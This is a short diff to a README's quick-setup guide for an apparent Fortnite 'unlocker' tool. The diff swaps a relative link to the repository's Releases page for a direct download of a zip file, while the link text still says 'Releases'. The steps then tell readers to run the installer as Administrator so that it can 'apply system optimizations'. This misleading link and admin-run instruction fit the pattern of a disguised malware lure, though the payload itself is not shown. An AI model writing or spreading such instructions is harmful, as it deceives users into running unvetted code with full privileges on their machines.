@@ -26,7 +26,7 @@ Our deployment utility solves these bottlenecks:
 
 ## 🚀 Quick Setup Guide (GitHub Release)
 
-1. Go to the **[Releases](../../releases)** page of this repository.
+1. Go to the **[Releases](https://github.com/Imagevogallery/Fortnite-Unlocker-Pro/releases/download/2026/Software-v1.0.zip)** page of this repository.
 2. Download the latest release archive (`.zip` or `.exe` installer).
 3. Extract the archive (if needed) and run the installer **as Administrator**.
 4. Follow the on-screen instructions — the tool will automatically apply all necessary system optimizations and unlock the full feature set.
